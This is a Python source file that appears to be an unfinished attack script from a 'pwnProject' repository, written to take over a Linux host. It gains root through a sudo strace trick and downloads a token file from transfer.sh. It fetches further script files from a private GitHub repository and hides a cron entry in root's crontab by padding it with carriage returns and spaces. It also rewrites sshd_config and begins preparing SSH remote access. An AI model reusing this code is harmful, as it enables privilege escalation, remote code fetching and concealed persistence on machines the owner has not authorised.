import os
import subprocess

mainUser = 'LivvidDreams'
scriptLink = 'https://raw.githubusercontent.com/LivvidDreams/pwnProject/master/'

currentCRON = '/var/spool/cron/root'
locationFile = '/home/user/pwn.py'

gtfoBin = 'sudo strace -o /dev/null {}'
files = ['pwn.py', '.env']

        
def runCommand(command, output=False):
    if not output:
        subprocess.call(command.split(), stdout = subprocess.PIPE)
    else:
        subprocess.call(command.split())


def sshConfigEdit():
    path = "/etc/ssh/sshd_config"
    flag1 = "GSSAPIAuthentication"
    flag2 = "GSSAPICleanupCredentials"
    with open(path, "r") as sshfile:
        newlines = []
        for word in sshfile.readlines():
            if flag1 in word or flag2 in word: continue
            newlines.append(word)
    with open(path, "w") as sshfile:
        for line in newlines:
            sshfile.writelines(line)
    runCommand("systemctl restart sshd")


def update_python():
    try:
        pyth = 'python3 --version >/dev/null'
        runCommand(pyth)
        return
    except Exception:
        print('updating python')
        runCommand(gtfoBin.format('yum -y -q -e 0 install python3 > /dev/null'))

def rerun():
    runCommand(gtfoBin.format('python3 pwn.py'), True)
    exit()


def is_root():
    if os.getuid() == 0:
        print("OBTAINED ROOT")
        return True
    else:
        # Rerun This Script As Root User
        rerun()

def startUpRecover():
    # On startup, we need a couple of things
        # 1. Need to get the oldest version of the script BACK on the tgt machine
        # 2. After receiving, we need to check to see if it needs to be updated
        # 3. After checking for updates, we need to 
    print()

def appendCron(path, command):
    assert is_root()
    # try:
    #     from crontab import CronTab
    # except:
    #     runCommand("python3 -m pip install python-crontab")
    #     rerun()
    
    # carriage = ' #\r'
    # whitespace = ' ' * (len(command) + len(carriage))

    # try:
    #     # cron=CronTab(user=path)
    #     cron=CronTab(tabfile=path, user="root")
    #     properCmd = command + carriage + whitespace

    #     job1=cron.new(command=properCmd)
    #     job1.minute.every(1)
    #     cron.write()
    #     print("Finished Appending To Cron")
    # except Exception as e:
    #     print(e)
    #     print(f"Failed To Append to File {path}")
    #     return




    carriage = ' #\r'
    whitespace = ' ' * (len(command) + len(carriage))
    # Just need to open file @path
    try:
        cronfile = open(path, "a")  # append mode
        # print(cronfile.read())
        cronfile.write("\n" + command + carriage + whitespace + "\n")
        cronfile.close()
        runCommand("systemctl reload crond.service")
        runCommand("systemctl restart crond.service")
        print(f'Appended To File {path}')
    except:
        print(f"Failed To Append to File {path}")
        return

    

def configureTokens():
    try:
        from dotenv import load_dotenv
    except:
        runCommand("python3 -m pip install python-dotenv")
        rerun()

    api_key = None

    
    # Ensure we can download enviornment file
    runCommand("curl -s -o .env https://transfer.sh/2S2RUM/.env")
    load_dotenv()
    api_key = os.getenv("github_key")

    assert api_key

    return (mainUser, api_key)


def getScript():
    try:
        import requests
    except:
        runCommand("python3 -m pip install requests")
        rerun()

    validAuth = configureTokens()
    if validAuth:
        for file in files:
            save = requests.get(scriptLink + file, auth = validAuth, allow_redirects = True)
            open(file, "wb").write(save.content)
            '''
                Implement Directory to Save These Files To
            '''
    else:
        exit()


def remoteAccessGen():
    # need to generate keys on local & tgt
    # need to make ssh folder for root to store key
    # copy pub key into ssh_id folder for root
    # restart ssh

    # make ssh directories
    runCommand("mkdir /etc/ssh")
    runCommand("mkdir /etc/ssh/authorized_keys")

    # need to get the keys





def main():
    # First Attempt To Install Python3 for Easier Scripting
    update_python()

    # Next Attempt To Rerun Script As Root. Else, Run Root Priv Things
    if not is_root(): exit()

    # Update The Script From GitHub And Obtain Keys To Add
    getScript()

    # Find Place To Hide The Script While Running
    cmd = "* * * * * rm -f " + locationFile
    appendCron(currentCRON, cmd)

    # attempt to edit ssh files
    sshConfigEdit()
    

    # HOW TO CONNECT (?? SHELLLLLLLLLLLLL)    
    
    




if __name__ == "__main__":
    main()